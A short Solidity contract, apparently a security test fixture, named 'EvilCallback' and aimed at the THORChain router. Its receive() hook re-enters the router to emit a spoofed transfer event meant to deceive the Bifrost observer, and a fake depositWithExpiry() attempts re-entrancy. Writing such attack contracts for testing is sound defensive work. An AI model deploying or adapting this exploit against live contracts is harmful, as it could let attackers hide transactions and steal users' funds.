// SPDX-License-Identifier: MIT
// -------------------
// EvilCallback™ v1.0
// -------------------
pragma solidity 0.8.13;


interface iROUTER {
    function transferAllowance(address router, address newVault, address asset, uint amount, string memory memo) external;
    function deposit(address payable vault, address asset, uint amount, string memory memo) external;
}

contract EvilCallback {
    address ROUTER;
    constructor(address router) {
        ROUTER = router;
    }
    /*
     When THORChain sends ETH to this contract, this code is executed.
     Here we immediately call back into the router to generate another event
     that tries to trick Bifrost into not observing this Yggdrasil tx
    */
    receive() external payable {
        iROUTER(msg.sender).transferAllowance(
            address(msg.sender), //oldVault (router)
            address(this),       //newVault
            address(0),          //asset
            0,                   //amount
            "EvilMemo"           //Memo 
        );
    }
    /*
    Fake depositWithExpiry() to attempt re-entrancy
    */
    function depositWithExpiry(address payable vault, address asset, uint amount, string memory memo, uint) external payable {
        iROUTER(ROUTER).deposit(vault, asset, amount, memo);
    }
}
